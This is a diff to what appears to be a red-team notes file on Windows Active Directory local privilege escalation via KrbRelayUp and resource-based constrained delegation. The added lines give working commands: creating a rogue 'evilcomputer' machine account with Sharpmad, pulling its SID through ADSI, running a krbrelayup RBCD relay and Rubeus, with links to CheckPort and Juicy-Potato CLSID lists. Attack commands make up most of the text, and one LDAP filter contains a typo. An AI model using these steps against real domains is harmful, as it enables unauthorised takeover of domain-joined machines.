@@ -28,12 +28,37 @@ impacket-addcomputer $domain.$tld/$username -computer-name '$cpName' -computer-p
 ```  
 
 Use [[Krbrelayup]] to Privilege Escalate *not* Lateral movement; we are on DC coercing the LDAP server to abuse `msDS-AllowedToActOnBehalfofotherIdentity` (fancy way of saying Resource based Constrained Delegation) - the machine can write to its own `msDS-AllowedToActOnBehalfofotherIdentity` and update this to want we want. Use `checkPort.exe` to get the correct port: [gist Tothi - No-Fix Local Privilege Escalation from low-privileged domain user to local system on domain-joined computers.](https://gist.github.com/tothi/bf6c59d6de5d0c9710f23dae5750c4b9)
+
+```powershell
+Sharpmad.exe MAQ -Action new -MachineAccount evilcomputer -MachinePassword pass.123
+
+# Get computer SID
+$o = ([ADSI]"LDAP://CN=evilcomputer,CN=Computers,DC=ecorp,DC=local").objectSID
+(New-Object System.Security.Principal.SecurityIdentifier($o.value, 0)).Value
+# Get Computer SID
+$f = "(&(objectCategroy=computer)(objectClass=computer)(cn=evilcomputer))"
+$s = ([ADSISearcher]$f).FindOne().Properties.objectSID
+(New-Object System.Security.Principal.SecurityIdentifier([byte[]]($s | Out-String -Stream), 0)).Value
+
+```
+
+Get COM Ports
+```powershell
+# NEED TO TEST - https://stackoverflow.com/questions/1081871/how-to-find-available-com-ports
+[System.IO.Ports.SerialPort]::GetPortNames()
+```
+
+Build and Execute assembly through sliver 
+https://github.com/cube0x0/KrbRelay/tree/main/CheckPort
+
+[Juicy-Potato CLSID lists](https://github.com/ohpe/juicy-potato/tree/master/CLSID)
 ```go
 // Use relay to resource constrained delegation - valuable to know this
 // Other is shadowprint
-krbrelayup '' relay -m rbcd -cls $CLSchooseTrustInstallerItsGoodByServer -p $port -cn '$computerName' -cp 'P@ssword1' -d $doman.$tld
+krbrelayup '' relay -m rbcd -cls $CLSchooseTrustInstallerItsGoodByServer -p $port -cn '$computerName' -cp 'P@ssword1' -d $domain.$tld
 // Check Machines and Delegations with LDAP for confirmation
 ```
+
 
 Use Rubeus for RBCD
 ```go
@@ -44,3 +69,4 @@ rubeus -i -M -- hash / password:P@ssword1 /user:$computerName /domain:$DSTdomain
 [YouTube Bishop Fox - Pwning the Domain With Sliver Framework](https://www.youtube.com/watch?v=PPNvN3P3ioY) 
 [GitHub - KrbRelayUp](https://github.com/Dec0ne/KrbRelayUp) 
 [gist Tothi - No-Fix Local Privilege Escalation from low-privileged domain user to local system on domain-joined computers.](https://gist.github.com/tothi/bf6c59d6de5d0c9710f23dae5750c4b9)
+[Juicy-Potato CLSID lists](https://github.com/ohpe/juicy-potato/tree/master/CLSID)
